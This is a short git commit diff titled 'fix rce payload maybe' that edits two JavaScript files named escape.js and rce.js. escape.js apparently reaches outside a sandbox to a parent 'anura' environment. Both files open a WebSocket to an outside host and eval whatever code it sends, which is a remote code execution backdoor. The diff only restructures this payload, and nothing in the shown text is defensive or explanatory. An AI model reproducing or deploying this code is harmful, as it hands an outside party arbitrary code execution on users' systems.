e8b65c7339c29dc666455488a9beaa4270deb6f5
Entrpix <git@entr.pics>
2026-02-15 11:40:02 -0500

    fix rce payload maybe

--- public/escape.js
+++ public/escape.js
@@ -1,10 +1,12 @@
 (async function () {})
     .constructor("return top.anura")()
     .then(async (anura) => {
-        const payload = `let ws = new anura.net.WebSocket("wss://anura.entr.pics/ws/");
-        ws.addEventListener("message", (ev) => {
-            eval(ev.data);
-        });`;
+        const payload = `(() => {
+    let ws = new anura.net.WebSocket("wss://anura.entr.pics/ws/");
+    ws.addEventListener("message", (ev) => {
+        eval(ev.data);
+    })
+})();`;
 
         const ui8a = await anura.fs.providers
             .get("/")
--- public/rce.js
+++ public/rce.js
@@ -1,4 +1,6 @@
-let ws = new anura.net.WebSocket("wss://anura.entr.pics/ws/");
-ws.addEventListener("message", (ev) => {
-    eval(ev.data);
-});
+(() => {
+    let ws = new anura.net.WebSocket("wss://anura.entr.pics/ws/");
+    ws.addEventListener("message", (ev) => {
+        eval(ev.data);
+    });
+})();
